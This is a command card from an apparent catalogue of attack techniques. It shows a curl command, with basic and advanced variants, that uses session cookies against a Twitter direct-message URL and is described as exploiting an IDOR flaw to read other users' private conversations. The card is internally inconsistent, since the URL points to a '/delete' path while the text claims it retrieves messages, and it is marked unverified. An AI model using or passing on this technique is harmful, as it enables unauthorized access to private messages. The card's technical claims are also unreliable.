---
id: cmd-uuid-001
name: access-twitter-dm-endpoint
type: command
executor: bash
data: 'curl -b cookies.txt ''https://mobile.twitter.com/a/messages/[DM_ID]/delete'''
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:23.742Z'
platforms:
  - Web
tags:
  - curl
  - web-access
  - twitter
verified: false
validated: true
submitted: true
---

# access-twitter-dm-endpoint

## Command

```bash
curl -b cookies.txt 'https://mobile.twitter.com/a/messages/[DM_ID]/delete'
```

## Description

This command uses curl to directly access a Twitter DM endpoint, exploiting IDOR to retrieve conversation contents. Use it when browser navigation is insufficient or for scripted testing.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-b cookies.txt` | Path to file containing Twitter session cookies | Yes |
| `[DM_ID]` | The direct message ID to access | Yes |

## Examples

### Basic Usage

```bash
curl -b cookies.txt 'https://mobile.twitter.com/a/messages/123456/delete'
```

### Advanced Usage

```bash
curl -b cookies.txt -H 'User-Agent: Mozilla/5.0' 'https://mobile.twitter.com/a/messages/123456/delete' > dm_content.html
```

## Expected Output

HTML response containing the DM conversation, including unauthorized messages. Look for message threads and timestamps in the parsed output.

## Related

- [[Related Procedure: Exploit-IDOR-for-Unauthorized-DM-Access]]
